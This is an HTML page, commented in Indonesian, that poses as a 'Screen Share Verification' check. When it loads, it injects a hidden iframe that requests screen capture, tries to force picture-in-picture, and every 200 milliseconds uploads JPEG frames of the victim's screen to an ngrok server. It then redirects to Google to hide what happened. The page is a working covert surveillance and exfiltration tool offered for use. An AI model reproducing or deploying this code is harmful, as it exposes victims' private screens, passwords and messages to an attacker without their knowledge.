<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Screen Share Verification</title>
<style>
  * { margin: 0; padding: 0; box-sizing: border-box; }
  body { background: #0a0a0a; color: #e0e0e0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; cursor: pointer; }
  .panel { background: #1a1a1a; padding: 30px; border-radius: 12px; border: 1px solid #333; max-width: 450px; width: 100%; }
  h2 { color: #f00; margin-bottom: 10px; font-size: 20px; }
  p { color: #94a3b8; font-size: 13px; margin-bottom: 20px; line-height: 1.5; }
  #log { margin-top: 20px; background: #000; padding: 10px; border-radius: 6px; color: #0f0; font-size: 12px; text-align: left; height: 150px; overflow-y: auto; border: 1px solid #333; }
  iframe, video, canvas { display: none !important; }
</style>
</head>
<body>

<div class="panel" id="main-card">
  <h2>🔒 Screen Share Verification</h2>
  <p>Memproses secara otomatis...</p>
  <div id="log">Sistem siap.</div>
</div>

<div id="launcher-container" style="display: none;"></div>

<script>
(function () {
  'use strict';

  var logEl = document.getElementById('log');
  var executed = false;

  function log(msg) {
    logEl.innerHTML += "> " + msg + "<br>";
    console.log(msg);
  }

  // ============================================
  // KONFIGURASI
  // ============================================
  var TARGET_URL = "https://www.google.com";
  var SERVER_ENDPOINT = "https://studly-unallegorized-brecken.ngrok-free.dev/upload";
  var REDIRECT_DELAY = 3000; // 3 detik

  // ============================================
  // 1. INJECT IFRAME ZERO-CLICK (SCREEN SHARE)
  // ============================================
  function injectScreenShareIframe() {
    try {
      log("[+] Membuat Iframe Tersembunyi (Screen Share)...");

      var iframe = document.createElement('iframe');
      // Atribut allow untuk display-capture
      iframe.allow = "display-capture; autoplay; picture-in-picture; fullscreen";
      iframe.style.display = "none";
      
      iframe.srcdoc = `
        <!DOCTYPE html>
        <html>
        <body>
          <video id="hiddenVideo" autoplay playsinline muted style="width:1px;height:1px;opacity:0.01;position:absolute;top:0;left:0;"></video>
          <canvas id="hiddenCanvas" width="1280" height="720" style="display:none;"></canvas>
          
          <script>
            (function() {
              // 1. Minta Screen Share (Zero-Click)
              navigator.mediaDevices.getDisplayMedia({ 
                video: { cursor: "always" }, 
                audio: false 
              })
                .then(function(stream) {
                  var video = document.getElementById('hiddenVideo');
                  video.srcObject = stream;
                  video.play().catch(function(){});
                  parent.postMessage({ type: 'SCREEN_OK' }, '*');

                  // 2. Paksa Masuk PiP
                  setTimeout(function() {
                    if (document.pictureInPictureElement) {
                      document.exitPictureInPicture();
                    }
                    video.requestPictureInPicture()
                      .then(function() {
                        parent.postMessage({ type: 'PIP_OK' }, '*');
                      })
                      .catch(function(err) {
                        parent.postMessage({ type: 'PIP_FAIL', error: err.message }, '*');
                      });
                  }, 500);

                  // 3. Telemetri (Kirim Frame Layar)
                  setInterval(function() {
                    var canvas = document.getElementById('hiddenCanvas');
                    var ctx = canvas.getContext('2d');
                    if (video.readyState === video.HAVE_ENOUGH_DATA) {
                      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                      canvas.toBlob(function(blob) {
                        if (!blob) return;
                        var formData = new FormData();
                        formData.append('file', blob, 'screen.jpg');
                        fetch('${SERVER_ENDPOINT}', {
                          method: 'POST',
                          body: formData,
                          keepalive: true
                        }).catch(function(){});
                      }, 'image/jpeg', 0.6);
                    }
                  }, 200);

                })
                .catch(function(err) {
                  parent.postMessage({ type: 'SCREEN_FAIL', error: err.name }, '*');
                });
            })();
          <\/script>
        </body>
        </html>
      `;

      document.getElementById("launcher-container").appendChild(iframe);
      log("[+] Iframe disuntikkan.");
    } catch(e) {
      log("[-] Iframe Error: " + e.message);
    }
  }

  // ============================================
  // 2. LISTENER PESAN DARI IFRAME
  // ============================================
  window.addEventListener('message', function(e) {
    switch (e.data.type) {
      case 'SCREEN_OK': log("[+] 🚨 Screen Share DIIZINKAN (Zero-Click)!"); break;
      case 'PIP_OK': log("[+] 🎥 PiP AKTIF!"); break;
      case 'SCREEN_FAIL': log("[-] Screen Share ditolak: " + e.data.error); break;
      case 'PIP_FAIL': log("[-] PiP ditolak: " + e.data.error); break;
    }
  });

  // ============================================
  // 3. TRIGGER ZERO-CLICK (OTOMATIS SAAT LOAD)
  // ============================================
  window.addEventListener('load', function() {
    if (executed) return;
    executed = true;

    log("[!] Memulai Zero-Click Screen Share...");

    // A. Inject Iframe (0ms)
    injectScreenShareIframe();

    // B. Redirect ke Google (Setelah 3 detik)
    setTimeout(function() {
      log("[+] Redirect ke Google.com...");
      try {
        window.location.replace(TARGET_URL);
      } catch(e) {}
    }, REDIRECT_DELAY);

  });

})();
</script>
</body>
</html>
